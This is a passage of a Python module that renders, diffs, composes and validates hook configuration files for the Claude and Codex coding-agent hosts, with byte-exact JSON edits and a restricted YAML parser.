    for item in passthrough or ():
        name = item.get("name")
        raw = item.get("raw")
        if not isinstance(name, str) or not isinstance(raw, str):
            raise ValueError("passthrough entries need name and raw")
        if name not in HOOK_PASSTHROUGH_KEYS[host]:
            raise ValueError(f"{name} is not a {host} passthrough key")
        members.append((name, raw))
    return members



def _render_hook_handler(
    members: list[tuple[str, str]],
    style: Mapping[str, str],
    indent: str,
) -> str:
    body = [
        json.dumps(name, ensure_ascii=False) + ": " + raw
        for name, raw in members
    ]
    if style["handler_form"] == "one-line":
        return "{ " + ", ".join(body) + " }"
    newline = style["newline"]
    inner = indent + style["indent"]
    joined = ("," + newline).join(inner + line for line in body)
    return "{" + newline + joined + newline + indent + "}"



def hook_render_style(style: Mapping[str, Any]) -> dict[str, str]:
    """Validate and complete one style(F) mapping for rendering."""

    if not isinstance(style, Mapping):
        raise ValueError("hook render style must be a JSON object")
    indent = style.get("indent", HOOK_JSON_INDENT_UNITS[0])
    if indent not in HOOK_JSON_INDENT_UNITS:
        raise ValueError(f"invalid hook render indent: {indent!r}")
    newline = style.get("newline", "\n")
    if newline not in {"\n", "\r\n"}:
        raise ValueError("hook render newline must be LF or CRLF")
    handler_form = style.get("handler_form", "multi-line")
    if handler_form not in {"one-line", "multi-line"}:
        raise ValueError(f"invalid handler form: {handler_form!r}")
    group_indent = style.get("group_indent", indent * 3)
    if not isinstance(group_indent, str) or group_indent.strip(" \t"):
        raise ValueError("hook render group_indent must be whitespace")
    return {
        "indent": indent,
        "newline": newline,
        "handler_form": handler_form,
        "group_indent": group_indent,
    }



def render_hook_group(
    entry: Mapping[str, Any],
    *,
    host: str,
    style: Mapping[str, Any],
    creating: bool = False,
    passthrough: Optional[Iterable[Mapping[str, Any]]] = None,
) -> bytes:
    """Render the canonical bytes of one owned hooks group."""

    resolved = hook_render_style(style)
    model = hook_entry_target(entry, host)
    if model["surface"] != HOOK_JSON_SURFACES[host]:
        raise ValueError(
            f"{host} surface {model['surface']} has no JSON carrier"
        )
    if "command" not in model["handler"]:
        raise ValueError("a projected hook entry requires a command")
    newline = resolved["newline"]
    indent = resolved["indent"]
    group_indent = resolved["group_indent"]
    handler_indent = group_indent + indent * 2
    handler_text = _render_hook_handler(
        _hook_handler_members(
            model, host=host, creating=creating, passthrough=passthrough
        ),
        resolved,
        handler_indent,
    )
    hooks_text = (
        "["
        + newline
        + handler_indent
        + handler_text
        + newline
        + group_indent
        + indent
        + "]"
    )
    members: list[tuple[str, str]] = []
    if model["matcher"] is not None:
        members.append(("matcher", _render_json_scalar(model["matcher"])))
    members.append(("hooks", hooks_text))
    lines = [
        group_indent
        + indent
        + json.dumps(name, ensure_ascii=False)
        + ": "
        + raw
        for name, raw in members
    ]
    rendered = (
        "{"
        + newline
        + ("," + newline).join(lines)
        + newline
        + group_indent
        + "}"
    )
    return rendered.encode("utf-8")



def _normalize_hook_scalar(value: Any) -> Any:
    if isinstance(value, str):
        return value.strip(" \t\n\r\v\f")
    return value



def normalize_codex_timeout(
    event: Optional[str], timeout: Optional[int]
) -> Optional[int]:
    """Apply the Codex timeout default and clamp before trust hashing."""

    if event is None:
        return timeout
    if event in CODEX_SHORT_TIMEOUT_EVENTS:
        value = 1 if timeout is None else timeout
        return min(max(value, 1), 3)
    value = CODEX_DEFAULT_HOOK_TIMEOUT if timeout is None else timeout
    return max(value, 1)



def compare_hook_handler(
    declared: Optional[Mapping[str, Any]],
    actual: Optional[Mapping[str, Any]],
    *,
    host: str,
    event: Optional[str] = None,
) -> dict[str, Any]:
    """Classify a rendered handler against an existing one."""

    if host not in HOOK_CARRIER_PATHS:
        raise ValueError(f"invalid hook host: {host}")
    if declared is not None and not isinstance(declared, Mapping):
        raise ValueError("declared handler must be a JSON object")
    if actual is not None and not isinstance(actual, Mapping):
        raise ValueError("actual handler must be a JSON object")
    result: dict[str, Any] = {
        "contract": HOOK_HANDLER_COMPARISON_SPEC,
        "host": host,
        "event": event,
        "equal": False,
        "classification": "absent",
        "extra_keys": [],
        "absent_fields": [],
        "diff_fields": [],
        "passthrough_keys": [],
        "semantics_changing_keys": [],
        "foreign_type": False,
        "never_project_type": False,
        "codex_identity_changed": None,
        "codex_identity_diff": [],
    }
    if actual is None:
        return result
    passthrough, semantics, unknown = _classify_host_keys(actual, host)
    result["passthrough_keys"] = sorted(passthrough)
    result["semantics_changing_keys"] = sorted(semantics)
    result["extra_keys"] = sorted(unknown)
    actual_type = _normalize_hook_scalar(actual.get("type"))
    if actual_type != "command":
        result["foreign_type"] = True
        result["never_project_type"] = (
            actual_type in HOOK_NEVER_PROJECT_TYPES
        )
        result["classification"] = "foreign-type"
        return result
    if declared is None:
        result["classification"] = "identity-change"
        return result
    applicable = HOOK_HOST_HANDLER_KEYS[host]
    absent: list[str] = []
    differing: list[str] = []
    for name in sorted(applicable):
        left = _normalize_hook_scalar(declared.get(name))
        right = _normalize_hook_scalar(actual.get(name))
        if left is not None and right is None:
            absent.append(name)
        elif left != right:
            differing.append(name)
    result["absent_fields"] = absent
    result["diff_fields"] = differing
    changed = set(absent) | set(differing)
    if not changed:
        if semantics:
            result["classification"] = "semantics-divergent"
        elif unknown:
            result["classification"] = "extra-keys"
        elif passthrough:
            result["classification"] = "passthrough-only"
            result["equal"] = True
        else:
            result["classification"] = "identical"
            result["equal"] = True
    elif host == "codex" and changed == {"commandWindows"}:
        result["classification"] = "commandWindows-only"
    else:
        result["classification"] = "identity-change"
    if host == "codex":
        identity: list[str] = []
        for name in CODEX_TRUST_IDENTITY_FIELDS:
            if name == "timeout":
                if normalize_codex_timeout(
                    event, declared.get("timeout")
                ) != normalize_codex_timeout(event, actual.get("timeout")):
                    identity.append(name)
                continue
            left = _normalize_hook_scalar(declared.get(name))
            if left is None:
                continue
            if left != _normalize_hook_scalar(actual.get(name)):
                identity.append(name)
        result["codex_identity_diff"] = sorted(identity)
        result["codex_identity_changed"] = bool(identity)
    return result


HOOK_DEGRADATION_BODY = (
    "# Hook intent: {id}\n"
    "\n"
    "Codex has no native hook carrier for the `{event}` event, so this"
    " `{hook_class}`\n"
    "intent is carried as a standing instruction instead of an executable"
    " hook.\n"
    "\n"
    "- Trigger: {trigger}\n"
    "- Purpose: {purpose}\n"
    "- Command: {command}\n"
    "- Environment: {environment}\n"
    "- Failure policy: {failure_policy}\n"
    "\n"
    "Follow this instruction whenever the trigger condition holds. Bridge"
    " projects\n"
    "no executable hook for this entry on Codex, so nothing runs"
    " automatically.\n"
)



def _hook_entry_bullets(entry: Mapping[str, Any]) -> dict[str, str]:
    raw = entry.get("bullets")
    bullets: dict[str, str] = {}
    if isinstance(raw, Mapping):
        for label in HOOK_BULLET_LABELS:
            bullets[label] = raw.get(label)
    elif isinstance(raw, list):
        for item in raw:
            if isinstance(item, Mapping):
                bullets[item.get("label")] = item.get("text")
    else:
        raise ValueError("hook entry needs a bullets map or list")
    for label in HOOK_BULLET_LABELS:
        text = bullets.get(label)
        if not isinstance(text, str) or not text.strip(" \t"):
            raise ValueError(f"hook entry bullet {label} is missing")
        if "\n" in text or "\r" in text:
            raise ValueError(f"hook entry bullet {label} spans lines")
        bullets[label] = text.strip(" \t")
    return bullets



def render_hook_degradation(entry: Mapping[str, Any]) -> bytes:
    """Render the hd1 managed block body for a degraded Codex hook."""

    if not isinstance(entry, Mapping):
        raise ValueError("hook entry must be a JSON object")
    entry_id = _require_hook_string(entry.get("id"), "id")
    if re.fullmatch(r"[a-z0-9][a-z0-9-]*", entry_id) is None:
        raise ValueError(f"invalid hook entry id: {entry_id}")
    event = _require_hook_string(entry.get("event"), "event")
    hook_class = entry.get("class")
    if hook_class not in PROSE_ELIGIBLE_HOOK_CLASSES:
        raise ValueError(
            "degradation-ineligible: class must be reminder or observation"
        )
    if event in CODEX_HOOK_EVENTS:
        raise ValueError(
            f"degradation-ineligible: {event} is native on codex"
        )
    bullets = _hook_entry_bullets(entry)
    body = HOOK_DEGRADATION_BODY.format(
        id=entry_id,
        event=event,
        hook_class=hook_class,
        trigger=bullets["Trigger"],
        purpose=bullets["Purpose"],
        command=bullets["Command"],
        environment=bullets["Environment"],
        failure_policy=bullets["Failure policy"],
    )
    return normalize_n(body.encode("utf-8"))


def _composition_refusal(token: str, detail: str) -> ValueError:
    return ValueError(f"composition-refused:{token}: {detail}")



def _handler_key_record(
    handler: Mapping[str, Any], name: str
) -> Optional[Mapping[str, Any]]:
    for key in handler["keys"]:
        if key["name"] == name:
            return key
    return None



def _member_indent_for(data: bytes, key: Mapping[str, Any]) -> str:
    indent = _line_indent(data, key["key_span"]["start"])
    return "" if indent is None else indent



def _handler_edits(
    data: bytes,
    handler: Mapping[str, Any],
    wanted: Mapping[str, Any],
    *,
    host: str,
    style: Mapping[str, str],
    preserve: Iterable[str] = (),
) -> list[dict[str, Any]]:
    edits: list[dict[str, Any]] = []
    keys = handler["keys"]
    names = [key["name"] for key in keys]
    untouched = set(preserve)
    fields = sorted(HOOK_HOST_HANDLER_KEYS[host])
    if host == "codex":
        untouched.add("statusMessage")
    fields = [name for name in fields if name not in untouched]
    for name in fields:
        record = _handler_key_record(handler, name)
        desired = wanted.get(name)
        if desired is None and record is None:
            continue
        if desired is None:
            position = names.index(name)
            if position > 0:
                start = keys[position - 1]["value_span"]["end"]
                end = record["value_span"]["end"]
            elif len(keys) > 1:
                start = record["key_span"]["start"]
                end = keys[1]["key_span"]["start"]
            else:
                start = handler["span"]["start"] + 1
                end = handler["span"]["end"] - 1
            edits.append(
                {
                    "start": start,
                    "end": end,
                    "replacement": b"",
                    "kind": "remove-key",
                    "key": name,
                }
            )
            continue
        rendered = _render_json_scalar(desired)
        if record is None:
            last = keys[-1]
            if handler["one_line"]:
                separator = ", "
            else:
                separator = (
                    ","
                    + style["newline"]
                    + _member_indent_for(data, last)
                )
            text = (
                separator
                + json.dumps(name, ensure_ascii=False)
                + ": "
                + rendered
            )
            edits.append(
                {
                    "start": last["value_span"]["end"],
                    "end": last["value_span"]["end"],
                    "replacement": text.encode("utf-8"),
                    "kind": "add-key",
                    "key": name,
                }
            )
            continue
        current = data[
            record["value_span"]["start"] : record["value_span"]["end"]
        ]
        try:
            parsed = json.loads(current.decode("utf-8"))
        except (UnicodeError, json.JSONDecodeError):
            parsed = None
        if _normalize_hook_scalar(parsed) == _normalize_hook_scalar(
            desired
        ):
            continue
        edits.append(
            {
                "start": record["value_span"]["start"],
                "end": record["value_span"]["end"],
                "replacement": rendered.encode("utf-8"),
                "kind": "replace-value",
                "key": name,
            }
        )
    return edits



def _desired_group_key(item: Mapping[str, Any]) -> tuple[str, int, str]:
    matcher = item.get("matcher")
    return (item["event"], 0 if matcher is None else 1, matcher or "")



def _validate_desired(
    desired: Mapping[str, Any]
) -> tuple[str, list[Mapping[str, Any]]]:
    if not isinstance(desired, Mapping):
        raise ValueError("desired image must be a JSON object")
    host = desired.get("host")
    if host not in HOOK_CARRIER_PATHS:
        raise ValueError(f"invalid hook host: {host}")
    groups = desired.get("groups")
    if not isinstance(groups, list):
        raise ValueError("desired image needs a groups array")
    seen: set[tuple[str, int, str]] = set()
    for item in groups:
        if not isinstance(item, Mapping):
            raise ValueError("each desired group must be an object")
        event = item.get("event")
        if not isinstance(event, str) or not event:
            raise ValueError("each desired group needs an event")
        matcher = item.get("matcher")
        if matcher is not None and not isinstance(matcher, str):
            raise ValueError("a desired group matcher must be a string")
        key = _desired_group_key(item)
        if key in seen:
            raise ValueError(f"duplicate desired group for {event}")
        seen.add(key)
    return host, sorted(groups, key=_desired_group_key)



def _carrier_signature(
    data: bytes,
    inspection: Mapping[str, Any],
    owned: set[tuple[str, Optional[str]]],
) -> tuple[Any, Any]:
    root = json_span_document(data)
    top: list[tuple[str, str]] = []
    if root["kind"] == "object":
        for member in root["members"]:
            if member["name"] == "hooks":
                continue
            top.append(
                (
                    member["name"],
                    data[
                        member["member_start"] : member["member_end"]
                    ].decode("utf-8", "replace"),
                )
            )
    unowned: list[tuple[str, str]] = []
    for event in inspection["events"]:
        for group in event["groups"]:
            matcher = (
                group["matcher"]["value"]
                if group["matcher"]["present"]
                else None
            )
            if (event["event"], matcher) in owned:
                continue
            unowned.append(
                (
                    event["event"],
                    data[
                        group["span"]["start"] : group["span"]["end"]
                    ].decode("utf-8", "replace"),
                )
            )
    return sorted(top), sorted(unowned)



def _apply_hook_edits(data: bytes, edits: list[dict[str, Any]]) -> bytes:
    ordered = sorted(edits, key=lambda edit: (edit["start"], edit["end"]))
    previous_end = -1
    for edit in ordered:
        if edit["start"] < previous_end:
            raise _composition_refusal(
                "edit-overlap", "two owned edits overlap"
            )
        previous_end = edit["end"]
    result = data
    for edit in reversed(ordered):
        result = (
            result[: edit["start"]]
            + edit["replacement"]
            + result[edit["end"] :]
        )
    return result



def _member_delete_spans(
    spans: list[Mapping[str, int]],
    positions: list[int],
    container: tuple[int, int],
) -> list[tuple[int, int]]:
    """Remove each member plus exactly one adjacent separator run."""

    runs: list[list[int]] = []
    for position in sorted(set(positions)):
        if runs and runs[-1][1] + 1 == position:
            runs[-1][1] = position
        else:
            runs.append([position, position])
    deletions: list[tuple[int, int]] = []
    for first, last in runs:
        if first > 0:
            deletions.append((spans[first - 1]["end"], spans[last]["end"]))
        elif last + 1 < len(spans):
            deletions.append((spans[first]["start"], spans[last + 1]["start"]))
        else:
            deletions.append(container)
    return deletions



def _group_element_delete_edits(
    record: Mapping[str, Any], indices: list[int], event: str
) -> list[dict[str, Any]]:
    groups = record["groups"]
    order = [group["index"] for group in groups]
    positions = [order.index(index) for index in indices]
    container = (
        record["array_span"]["start"] + 1,
        record["array_span"]["end"] - 1,
    )
    return [
        {
            "start": start,
            "end": end,
            "replacement": b"",
            "kind": "delete-group",
            "event": event,
        }
        for start, end in _member_delete_spans(
            [group["span"] for group in groups], positions, container
        )
    ]



def _event_member_delete_edits(
    inspection: Mapping[str, Any], events: list[str]
) -> list[dict[str, Any]]:
    order = [item["event"] for item in inspection["events"]]
    positions = [order.index(event) for event in events]
    container = (
        inspection["hooks_span"]["start"] + 1,
        inspection["hooks_span"]["end"] - 1,
    )
    return [
        {
            "start": start,
            "end": end,
            "replacement": b"",
            "kind": "delete-event",
            "event": None,
        }
        for start, end in _member_delete_spans(
            [item["member_span"] for item in inspection["events"]],
            positions,
            container,
        )
    ]



def _group_append_edit(
    data: bytes,
    record: Mapping[str, Any],
    rendered: list[bytes],
    style: Mapping[str, str],
    event: str,
) -> dict[str, Any]:
    newline = style["newline"]
    group_indent = style["group_indent"]
    separator = ("," + newline + group_indent).encode("utf-8")
    payload = separator.join(rendered)
    if record["groups"]:
        at = record["groups"][-1]["span"]["end"]
        return {
            "start": at,
            "end": at,
            "replacement": separator + payload,
            "kind": "create-group",
            "event": event,
        }
    event_indent = _line_indent(data, record["key_span"]["start"])
    if event_indent is None:
        event_indent = style["member_indent"]
    return {
        "start": record["array_span"]["start"] + 1,
        "end": record["array_span"]["end"] - 1,
        "replacement": (newline + group_indent).encode("utf-8")
        + payload
        + (newline + event_indent).encode("utf-8"),
        "kind": "create-group",
        "event": event,
    }



def _render_event_member(
    event: str,
    rendered: list[bytes],
    style: Mapping[str, str],
) -> str:
    newline = style["newline"]
    group_indent = style["group_indent"]
    body = ("," + newline + group_indent).join(
        item.decode("utf-8") for item in rendered
    )
    return (
        json.dumps(event, ensure_ascii=False)
        + ": ["
        + newline
        + group_indent
        + body
        + newline
        + style["member_indent"]
        + "]"
    )



def _hooks_member_insert_edit(
    data: bytes,
    members: list[str],
    style: Mapping[str, str],
) -> dict[str, Any]:
    root = json_span_document(data)
    if root["kind"] != "object":
        raise _composition_refusal(
            "unmodelled-root", "carrier root is not an object"
        )
    newline = style["newline"]
    member_indent = style["member_indent"]
    hooks_indent = style["hooks_indent"]
    body = ("," + newline + member_indent).join(members)
    text = (
        '"hooks": {'
        + newline
        + member_indent
        + body
        + newline
        + hooks_indent
        + "}"
    )
    if root["members"]:
        at = root["members"][-1]["member_end"]
        return {
            "start": at,
            "end": at,
            "replacement": ("," + newline + hooks_indent + text).encode(
                "utf-8"
            ),
            "kind": "create-hooks",
            "event": None,
        }
    root_indent = _line_indent(data, root["start"])
    return {
        "start": root["start"] + 1,
        "end": root["end"] - 1,
        "replacement": (
            newline
            + hooks_indent
            + text
            + newline
            + ("" if root_indent is None else root_indent)
        ).encode("utf-8"),
        "kind": "create-hooks",
        "event": None,
    }



def compose_hooks_json(
    data: bytes,
    desired: Mapping[str, Any],
    *,
    verify: bool = True,
) -> dict[str, Any]:
    """Compose the desired full image of one hooks carrier."""

    host, groups = _validate_desired(desired)
    inspection = inspect_hooks_json(data, host=host)
    reason = _carrier_failure_reason(inspection)
    if reason is not None:
        raise HooksCarrierError(reason, "hooks carrier is unusable")
    style = inspection["style"]
    render_style = {
        "indent": style["indent"],
        "newline": style["newline"],
        "handler_form": style["handler_form"],
        "group_indent": style["group_indent"],
    }
    owned: set[tuple[str, Optional[str]]] = set()
    edits: list[dict[str, Any]] = []
    per_event: dict[str, dict[str, Any]] = {}
    for item in groups:
        event = item["event"]
        matcher = item.get("matcher")
        entry = item.get("entry")
        owned.add((event, matcher))
        bucket = per_event.setdefault(event, {"delete": [], "create": []})
        record = _event_record(inspection, event)
        found = (
            _matching_groups(record, matcher) if record is not None else []
        )
        if len(found) > 1:
            raise HooksCarrierError(
                "group-ambiguous", f"{event} has duplicate owned groups"
            )
        if entry is not None:
            model = hook_entry_target(entry, host)
            if model["matcher"] != matcher:
                raise _composition_refusal(
                    "matcher-mismatch",
                    f"{event} desired matcher does not match the entry",
                )
            if "command" not in model["handler"]:
                raise _composition_refusal(
                    "missing-command",
                    f"{event} desired entry declares no command",
                )
        if not found:
            if entry is None:
                continue
            bucket["create"].append(
                render_hook_group(
                    entry,
                    host=host,
                    style=render_style,
                    creating=True,
                    passthrough=item.get("passthrough"),
                )
            )
            continue
        group = found[0]
        if entry is None:
            bucket["delete"].append(group["index"])
            continue
        handlers = group["handlers"]
        commands = [
            handler for handler in handlers if handler["type"] == "command"
        ]
        if len(handlers) != len(commands):
            raise _composition_refusal(
                "foreign-handler",
                f"{event} owned group carries a non-command handler",
            )
        if len(commands) != 1:
            raise _composition_refusal(
                "multi-handler",
                f"{event} owned group has {len(commands)} handlers",
            )
        wanted = dict(model["handler"])
        preserve: tuple[str, ...] = ()
        if _handler_key_record(commands[0], "statusMessage") is not None:
            preserve = ("statusMessage",)
        elif host == "claude":
            wanted["statusMessage"] = (
                model["status_message"] or f"[bridge:{model['id']}]"
            )
        elif model["status_message"] is not None:
            wanted["statusMessage"] = model["status_message"]
        edits.extend(
            _handler_edits(
                data,
                commands[0],
                wanted,
                host=host,
                style=style,
                preserve=preserve,
            )
        )
    pending_events: dict[tuple[int, int, str, str], list[str]] = {}
    pending_hooks: list[str] = []
    emptied_events: list[str] = []
    for event, bucket in sorted(per_event.items()):
        record = _event_record(inspection, event)
        if bucket["delete"] and record is not None:
            remaining = len(record["groups"]) - len(bucket["delete"])
            if remaining == 0 and not bucket["create"]:
                emptied_events.append(event)
                continue
            edits.extend(
                _group_element_delete_edits(
                    record, bucket["delete"], event
                )
            )
        if not bucket["create"]:
            continue
        if record is not None:
            edits.append(
                _group_append_edit(
                    data, record, bucket["create"], style, event
                )
            )
            continue
        member = _render_event_member(event, bucket["create"], style)
        if inspection["hooks_span"] is None:
            pending_hooks.append(member)
            continue
        position = _event_insertion_position(
            data, inspection, inspection["hooks_span"], event
        )
        pending_events.setdefault(position, []).append(member)
    if emptied_events:
        edits.extend(
            _event_member_delete_edits(inspection, emptied_events)
        )
    for position, members in sorted(pending_events.items()):
        at, end, prefix, suffix = position
        separator = "," + style["newline"] + style["member_indent"]
        edits.append(
            {
                "start": at,
                "end": end,
                "replacement": (
                    prefix + separator.join(members) + suffix
                ).encode("utf-8"),
                "kind": "create-event",
                "event": None,
            }
        )
    if pending_hooks:
        edits.append(
            _hooks_member_insert_edit(data, pending_hooks, style)
        )
    postimage = _apply_hook_edits(data, edits)
    result: dict[str, Any] = {
        "contract": HOOKS_JSON_COMPOSITION_SPEC,
        "host": host,
        "changed": bool(edits),
        "edits": sorted(
            (
                {
                    "start": edit["start"],
                    "end": edit["end"],
                    "kind": edit["kind"],
                    "key": edit.get("key"),
                    "event": edit.get("event"),
                }
                for edit in edits
            ),
            key=lambda edit: (edit["start"], edit["end"], edit["kind"]),
        ),
        "preimage": {
            "bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(),
        },
        "postimage": {
            "bytes": len(postimage),
            "sha256": hashlib.sha256(postimage).hexdigest(),
            "base64": base64.b64encode(postimage).decode("ascii"),
        },
        "unowned_preserved": True,
        "idempotent": True,
    }
    if not edits:
        return result
    first = min(edit["start"] for edit in edits)
    last = max(edit["end"] for edit in edits)
    tail = len(data) - last
    if postimage[:first] != data[:first] or (
        tail and postimage[len(postimage) - tail :] != data[last:]
    ):
        raise _composition_refusal(
            "outside-span-change", "prefix or suffix bytes changed"
        )
    if verify:
        after = inspect_hooks_json(postimage, host=host)
        if not after["ok"]:
            raise _composition_refusal(
                "postimage-unusable", ", ".join(after["anomalies"])
            )
        if _carrier_signature(
            data, inspection, owned
        ) != _carrier_signature(postimage, after, owned):
            raise _composition_refusal(
                "unowned-bytes-changed", "an unowned span was rewritten"
            )
        replay = compose_hooks_json(postimage, desired, verify=False)
        if replay["changed"]:
            raise _composition_refusal(
                "not-idempotent", "recomposition produced further edits"
            )
    return result


HOOK_YAML_TOP_KEYS = (
    "class",
    "command",
    "enabled",
    "event",
    "id",
    "matcher",
    "timeout",
)
HOOK_YAML_BLOCK_KEYS = ("enabled-by", "intent", "targets")



def _hook_yaml_scalar(text: str) -> tuple[bool, Any]:
    """Parse one closed-grammar scalar; never a general YAML parser."""

    if text == "":
        return False, None
    if text != text.strip(" \t"):
        return False, None
    if text.startswith('"'):
        try:
            value = json.loads(text)
        except json.JSONDecodeError:
            return False, None
        return (True, value) if isinstance(value, str) else (False, None)
    if text.startswith("'"):
        if len(text) < 2 or not text.endswith("'"):
            return False, None
        inner = text[1:-1]
        if inner.replace("''", "").find("'") >= 0:
            return False, None
        return True, inner.replace("''", "'")
    if text in {"true", "false"}:
        return True, text == "true"
    if re.fullmatch(r"-?[0-9]+", text) is not None:
        return True, int(text)
    if text[0] in "[]{}|>&*!%@`,#":
        return False, None
    if ": " in text or " #" in text:
        return False, None
    return True, text



def _hook_yaml_fields(
    lines: list[tuple[int, str]]
) -> tuple[dict[str, Any], list[dict[str, Any]]]:
    fields: dict[str, Any] = {}
    errors: list[dict[str, Any]] = []
    context: Optional[str] = None
    target: Optional[str] = None
    record: Optional[dict[str, Any]] = None

    def fail(reason: str, line: int) -> None:
        errors.append({"reason": reason, "line": line})

    for number, raw in lines:
        if not raw.strip(" \t"):
            continue
        stripped = raw.lstrip(" ")
        if stripped.startswith("#"):
            continue
        indent = len(raw) - len(stripped)
        if "\t" in raw[:indent] or indent % 2:
            fail("field-invalid", number)
            continue
        if indent == 0:
            context, target, record = None, None, None
            match = HOOK_YAML_KEY_PATTERN.fullmatch(stripped)
            if match is None:
                fail("unrecognized-field", number)
                continue
            key = match.group("key")
            value = match.group("value")
            if key in HOOK_YAML_BLOCK_KEYS:
                if value is not None or key in fields:
                    fail("field-invalid", number)
                    continue
                context = key
                fields[key] = {} if key == "targets" else []
                continue
            if key not in HOOK_YAML_TOP_KEYS:
                fail("unrecognized-field", number)
                continue
            if key in fields:
                fail("field-invalid", number)
                continue
            ok, parsed = _hook_yaml_scalar("" if value is None else value)
            if not ok:
                fail("field-invalid", number)
                continue
            fields[key] = parsed
            continue
        if context == "targets" and indent == 2:
            match = HOOK_YAML_KEY_PATTERN.fullmatch(stripped)
            if (
                match is None
                or match.group("value") is not None
                or match.group("key") not in HOOK_TARGET_KEYS
            ):
                fail("unrecognized-field", number)
                target = None
                continue
            target = match.group("key")
            if target in fields["targets"]:
                fail("field-invalid", number)
                target = None
                continue
            fields["targets"][target] = {}
            continue
        if context == "targets" and indent == 4 and target is not None:
            match = HOOK_YAML_KEY_PATTERN.fullmatch(stripped)
            if match is None:
                fail("unrecognized-field", number)
                continue
            key = match.group("key")
            if key not in HOOK_TARGET_KEYS[target]:
                fail("unrecognized-field", number)
                continue
            if key in fields["targets"][target]:
                fail("field-invalid", number)
                continue
            ok, parsed = _hook_yaml_scalar(match.group("value") or "")
            if not ok:
                fail("field-invalid", number)
                continue
            fields["targets"][target][key] = parsed
            continue
        if context in {"enabled-by", "intent"} and indent == 2:
            reason = (
                "enabled-by-malformed"
                if context == "enabled-by"
                else "field-invalid"
            )
            if not stripped.startswith("- date: "):
                fail(reason, number)
                record = None
                continue
            ok, parsed = _hook_yaml_scalar(stripped[len("- date: ") :])
            if not ok or not isinstance(parsed, str):
                fail(reason, number)
                record = None
                continue
            record = {"date": parsed, "note": None, "line": number}
            fields[context].append(record)
            continue
        if context in {"enabled-by", "intent"} and indent == 4:
            reason = (
                "enabled-by-malformed"
                if context == "enabled-by"
                else "field-invalid"
            )
            if record is None or not stripped.startswith("note: "):
                fail(reason, number)
                continue
            ok, parsed = _hook_yaml_scalar(stripped[len("note: ") :])
            if not ok or not isinstance(parsed, str):
                fail(reason, number)
                continue
            record["note"] = parsed
            continue
        fail("unrecognized-field", number)
    return fields, errors



def _hook_timeout_range(host: str, event: str) -> tuple[int, Optional[int]]:
    if host == "codex":
        if event in CODEX_SHORT_TIMEOUT_EVENTS:
            return HOOK_TIMEOUT_RANGES[("codex", "short")]
        return HOOK_TIMEOUT_RANGES[("codex", "default")]
    if event == "SessionEnd":
        return HOOK_TIMEOUT_RANGES[("claude", "short")]
    return HOOK_TIMEOUT_RANGES[("claude", "default")]



def _hook_prose_eligible(host: str, event: str) -> bool:
    if host == "codex":
        return event not in CODEX_HOOK_EVENTS
    return event in CODEX_ONLY_HOOK_EVENTS



def _valid_hook_record_date(value: Any) -> bool:
    """Report whether one record date is a valid calendar date."""

    if not isinstance(value, str):
        return False
    if HOOK_RECORD_DATE_PATTERN.fullmatch(value) is None:
        return False
    try:
        datetime.date.fromisoformat(value)
    except ValueError:
        return False
    return True



def _valid_hook_record_note(value: Any) -> bool:
    """Report whether one fenced-block record note keeps the grammar."""

    if not isinstance(value, str) or not value:
        return False
    if value != value.strip(" \t"):
        return False
    return not any(char in value for char in ("\n", "\r", "\x00"))



def _hook_matcher_domain_names(host: str, matcher: str) -> list[str]:
    """Resolve the exact names one matcher can select on that host."""

    if host == "claude":
        if HOOK_CLAUDE_LIST_MATCHER_CLASS.fullmatch(matcher) is None:
            return []
        names = [
            element.strip(" ")
            for element in HOOK_CLAUDE_LIST_SEPARATORS.split(matcher)
        ]
        return [name for name in names if name]
    if HOOK_REGEX_METACHARACTER_PATTERN.search(matcher) is not None:
        return []
    return [matcher] if matcher else []



def _validate_hook_entry(
    entry: dict[str, Any], acknowledged: bool
) -> None:
    fields = entry["fields"]
    line = entry["yaml_line"]

    def fail(reason: str, at: Optional[int] = None) -> None:
        entry["anomalies"].append(
            {"reason": reason, "line": line if at is None else at}
        )

    def advise(token: str) -> None:
        if token not in entry["advisories"]:
            entry["advisories"].append(token)

    def lint(token: str) -> None:
        """Record a non-invalidating lint; the entry keeps every unit row."""

        if token not in entry["lints"]:
            entry["lints"].append(token)

    entry_id = fields.get("id")
    if not isinstance(entry_id, str):
        fail("field-missing")
    elif entry_id != entry["id"]:
        fail("id-heading-mismatch")
    event = fields.get("event")
    if not isinstance(event, str) or not event:
        fail("field-missing")
        event = None
    hook_class = fields.get("class")
    if hook_class is None:
        fail("class-missing")
    elif hook_class not in HOOK_CLASSES:
        fail("enum-invalid")
        hook_class = None
    enabled = fields.get("enabled")
    if not isinstance(enabled, bool):
        fail("field-missing" if enabled is None else "field-invalid")
        enabled = None
    matcher = fields.get("matcher")
    if matcher is not None and not isinstance(matcher, str):
        fail("field-invalid")
        matcher = None
    command = fields.get("command")
    if command is not None and not isinstance(command, str):
        fail("field-invalid")
        command = None
    timeout = fields.get("timeout")
    if timeout is not None and (
        isinstance(timeout, bool) or not isinstance(timeout, int)
    ):
        fail("field-invalid")
        timeout = None
    targets = fields.get("targets")
    if not isinstance(targets, dict) or set(targets) != {
        "claude",
        "codex",
    }:
        fail("field-missing")
        entry["valid"] = not entry["anomalies"]
        return
    if event is not None and event not in (
        SHARED_HOOK_EVENTS | CODEX_ONLY_HOOK_EVENTS
    ):
        entry["event_verified"] = False
        advise("event-unverified")
    needs_command = False
    for host in ("claude", "codex"):
        target = targets[host]
        surface = target.get("surface")
        tier = target.get("tier")
        if surface not in HOOK_SURFACES[host]:
            if surface in HOOK_SURFACES[
                "codex" if host == "claude" else "claude"
            ]:
                fail("surface-host-mismatch")
            else:
                fail("enum-invalid")
            continue
        if tier not in HOOK_TIERS:
            fail("enum-invalid")
            continue
        entry["authenticated"].append(
            {"host": host, "surface": surface, "tier": tier}
        )
        expected = {
            HOOK_JSON_SURFACES[host]: "native",
            HOOK_PROSE_SURFACES[host]: "semantic",
            "none": "declared-unsynced",
        }[surface]
        if tier != expected:
            fail("tier-surface-mismatch")
        overrides = [
            key
            for key in HOOK_OVERRIDE_KEYS[host]
            if target.get(key) is not None
        ]
        reason = target.get("override-reason")
        if overrides and reason is None:
            fail("override-without-reason")
        if reason is not None:
            if reason not in HOOK_OVERRIDE_REASONS:
                fail("enum-invalid")
            elif not overrides:
                fail("reason-without-override")
        shell = target.get("shell")
        if shell is not None and shell not in HOOK_CLAUDE_SHELLS:
            fail("enum-invalid")
        if surface == "none":
            continue
        if surface == HOOK_PROSE_SURFACES[host]:
            if event is None or hook_class is None:
                continue
            if (
                hook_class not in PROSE_ELIGIBLE_HOOK_CLASSES
                or not _hook_prose_eligible(host, event)
            ):
                fail("degradation-ineligible")
